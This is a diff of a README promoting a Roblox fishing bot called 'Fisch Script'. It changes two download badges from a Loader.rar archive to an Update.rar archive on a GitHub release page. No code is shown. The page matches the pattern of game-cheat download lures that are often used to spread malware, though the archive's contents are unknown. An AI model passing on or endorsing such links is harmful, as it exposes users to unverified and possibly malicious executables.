@@ -1,11 +1,11 @@
 # 🎣 Fisch Script – Next-Level Roblox Fishing Bot (2025 Version)  
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-purple?style=for-the-badge&logo=download)](https://github.com/MIxBriks17/fisch-script/releases/download/Update/Loader.rar)  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-purple?style=for-the-badge&logo=download)](https://github.com/MIxBriks17/fisch-script/releases/download/Update/Update.rar)  
  
 
 ![newfis](https://github.com/user-attachments/assets/e7c4daf0-5275-48aa-b5e5-302948c20260)
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-purple?style=for-the-badge&logo=download)](https://github.com/MIxBriks17/fisch-script/releases/download/Update/Loader.rar)  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-purple?style=for-the-badge&logo=download)](https://github.com/MIxBriks17/fisch-script/releases/download/Update/Update.rar)  
  
 
 ---
